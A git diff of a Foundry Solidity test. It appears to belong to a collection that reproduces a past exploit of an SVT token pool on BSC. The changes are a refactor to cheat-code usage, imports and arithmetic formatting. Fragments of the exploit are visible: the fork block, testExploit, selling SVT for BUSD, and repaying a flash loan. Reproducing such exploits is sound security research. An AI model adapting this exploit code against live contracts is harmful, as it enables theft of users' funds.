@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/Phalcon_xyz/status/1695285435671392504?s=20
@@ -23,10 +22,8 @@ contract ContractTest is Test {
     ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);
     address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 31_178_238 - 1);
+        vm.createSelectFork("bsc", 31_178_238 - 1);
     }
 
     function testExploit() public {
@@ -49,7 +46,7 @@ contract ContractTest is Test {
         console2.log(svtBalance1);
         // Sell SVT for BUSD
         pool.sell(svtBalance2);
-        pool.sell(SVT.balanceOf(address(this)) * 62 / 100);
+        pool.sell((SVT.balanceOf(address(this)) * 62) / 100);
 
         BUSD.transfer(dodo, quoteAmount);
     }
